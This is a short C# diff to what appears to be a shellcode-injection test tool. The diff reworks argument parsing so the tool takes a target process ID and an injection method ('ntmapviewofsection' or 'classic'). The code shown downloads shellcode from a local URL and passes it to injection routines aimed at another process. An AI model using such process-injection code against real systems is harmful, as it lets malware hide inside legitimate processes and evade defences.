@@ -13,7 +13,11 @@ namespace ShellcodeTest
 
         static void Main(string[] args)
         {
-            pid = 12280;
+            int pid;
+            if (!int.TryParse(args[1], out pid))
+            {
+                Console.WriteLine($"Invalid Process ID {args[1]}");
+            }
             Process proc = Process.GetProcessById(pid);
 
             byte[] shellcode = new System.Net.WebClient().DownloadData("http://localhost/shellcode");
@@ -34,11 +38,11 @@ namespace ShellcodeTest
             }
             else
             {
-                if (args[0] == "NtMapViewOfSection")
+                if (args[0].ToLower() == "ntmapviewofsection")
                 {
                     ShellcodeInjectNtMapViewOfSection(shellcode, hProcess);
                 }
-                else if (args[0] == "VirtualAlloc")
+                else if (args[0].ToLower() == "classic")
                 {
                     ShellcodeInjectClassic(shellcode, hProcess);
                 }
